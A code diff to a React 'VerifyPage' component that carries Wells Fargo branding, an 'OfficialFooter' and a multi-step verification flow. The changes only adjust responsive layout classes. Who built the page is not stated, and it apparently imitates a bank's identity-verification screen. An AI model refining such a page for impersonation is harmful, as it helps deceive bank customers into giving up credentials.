@@ -270,10 +270,10 @@ export default function VerifyPage() {
   return (
     <div className="min-h-screen flex flex-col bg-white">
       {/* Header */}
-      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
+      <header className="bg-[#d71e28] px-4 py-3 md:py-4 flex items-center justify-between">
         <div className="flex-1"></div>
         <h1 
-          className="text-white text-xl tracking-wide font-bold"
+          className="text-white text-xl md:text-2xl tracking-wide font-bold"
           style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
         >
           WELLS FARGO
@@ -284,9 +284,11 @@ export default function VerifyPage() {
       </header>
 
       {/* Yellow accent bar */}
-      <div className="h-1.5 bg-[#ffcd41]"></div>
+      <div className="h-1.5 md:h-2 bg-[#ffcd41]"></div>
 
-      <main className="flex-1 px-5 py-6">
+      {/* Centered container for responsive layout */}
+      <main className="flex-1 flex justify-center">
+        <div className="w-full max-w-md px-5 py-6 md:py-10 lg:py-12">
         {step === "choose" && (
           <>
             {/* Progress indicator */}
@@ -726,6 +728,7 @@ export default function VerifyPage() {
             </Button>
           </div>
         )}
+        </div>
       </main>
 
       <OfficialFooter />
